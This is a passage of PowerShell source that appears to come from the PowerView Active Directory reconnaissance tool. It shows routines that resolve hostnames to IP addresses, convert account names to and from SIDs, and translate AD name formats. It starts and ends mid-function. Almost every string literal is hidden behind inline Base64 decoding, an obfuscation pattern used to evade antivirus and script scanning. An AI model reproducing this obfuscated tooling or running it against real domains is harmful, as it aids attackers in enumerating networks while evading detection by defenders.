        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA')))]) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }
        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation
            if (-not $Exists) {
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}
function Resolve-IPAddress {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                        $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}
function ConvertTo-SID {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $DomainSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $DomainSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $DomainSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]
                    $DomainSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserName
                    $DomainSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                    $DomainSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}
function ConvertFrom-SID {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $ObjectSid,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ADNameArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                Switch ($TargetSid) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}
function Convert-ADName {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $NameTypes = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $NULL, $Object, $Parameters)
            Write-Output $Output
        }
        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, $Parameters)
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            $ADSInitType = 3
            $InitName = $Null
        }
    }
    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAVAB5AHAAZQA=')))]) {
                if ($TargetIdentity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6AF0AKwBcAFwAWwBBAC0AWgBhAC0AegAgAF0AKwA=')))) {
                    $ADSOutputType = $NameTypes[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))]
                }
                else {
                    $ADSOutputType = $NameTypes[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))]
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }
            $Translate = New-Object -ComObject NameTranslate
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                try {
                    $Cred = $Credential.GetNetworkCredential()
                    Invoke-Method $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABFAHgA'))) (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
